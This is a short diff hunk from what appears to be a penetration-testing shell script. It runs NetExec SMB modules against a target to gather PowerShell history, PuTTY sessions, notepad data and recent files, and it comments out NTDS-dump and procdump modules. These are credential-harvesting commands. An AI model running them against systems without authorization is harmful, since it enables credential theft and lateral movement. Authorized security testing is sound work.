@@ -198,8 +198,8 @@ elevated)
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M notepad
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M notepad++
   # run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M ntds-dump-raw # We have ntdsutil?
-  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M powershell_history
-  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M powershell_history -o EXPORT=True # The flag migth not work - remove if so
+  # run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M powershell_history # Only need one of the powershell history
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M powershell_history -o EXPORT=True
   # run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M procdump # Require pypykatz
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M putty
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M recent_files
